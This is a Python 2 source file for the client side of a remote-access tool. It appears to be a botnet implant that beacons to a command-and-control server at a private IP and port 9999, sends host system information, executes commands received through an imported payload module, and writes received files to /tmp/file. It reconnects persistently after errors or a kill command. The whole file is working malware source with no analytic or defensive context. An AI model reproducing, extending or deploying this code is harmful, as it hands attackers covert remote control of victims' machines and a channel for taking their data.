import socket
import sys
import os
import payload
import struct
import time

u_string = lambda x, y: struct.unpack("<%ds" % y, x)
p_string = lambda x, y, z: struct.pack("<II%ds" % y, y, z, x)

# protocol is length of data in 4 byte unsigned int followed by an integer specifying
# the data type (text(0) or file(1)) followed by the data


class Slave:
    def __init__(self):
        self.c2_server = '192.168.1.14'
        self.c2_port = 9999
        self.c2 = None
        try:
            self.sysinfo = ' '.join(os.uname())
        except:
            self.sysinfo = os.name
        self.payloads = payload.Payload()
        self._connect_to_c2()
        self._send_init_info()
        self._listen()

    def _connect_to_c2(self):
        while True:
            try:
                print "[+] Connecting to C2"
                self.c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.c2.connect((self.c2_server, self.c2_port))

            except socket.error, (value, message):
                print "[-] Connection error"
                if self.c2:
                    self.c2.close()
                time.sleep(5)

            else:
                return

        print "[-] Could not create socket:", message
        sys.exit(1)

    def _send_init_info(self):
        try:
            print "[+] Sending system information"
            data = self.sysinfo
            self._format_and_send(data, 0)

            print "[+] Sending supported commands"
            data = ' '.join(self.payloads.commands)
            self._format_and_send(data, 0)

        # except Exception as e:
        except:
            print "[-] Error in send init:"

    def _listen(self):
        print "[+] Listening for commands"
        while True:
            try:
                command = self._receive_and_format().split(' ')
                print command
                args = ' '.join(command[1:])
                command = command[0]

                if command == "!kill":
                    self.c2.close()
                    time.sleep(5)
                    self.__init__()

                output, data_type = self.payloads.execute_command(command, args)

                if command == "Done":
                    output = "Done"
                    data_type = 0

                self._format_and_send(output, data_type)

            # except Exception as e:
            except:
                # self._connect_to_c2()
                print "[-] Error in listen:"
                self.c2.close()
                time.sleep(5)
                self.__init__()

    def _format_and_send(self, data, data_type):
        self.c2.sendall(p_string(data, len(data), data_type))

    def _receive_and_format(self):
        len_data = int(struct.unpack("<I", self.c2.recv(4))[0])
        type_data = int(struct.unpack("<I", self.c2.recv(4))[0])
        print type_data
        data = self.c2.recv(len_data)
        final_data = data

        while len(final_data) < len_data:
            size_to_recv = len_data - len(final_data)
            data = self.c2.recv(size_to_recv)
            final_data += data

        final_data = u_string(final_data, len_data)[0]
        print "Debug: len_data:", len_data
        print "Debug: data:", final_data
        if type_data == 0:
            return final_data
        elif type_data == 1:
            f = open('/tmp/file', 'wb')
            f.write(final_data)
            f.close()
            return "Done"
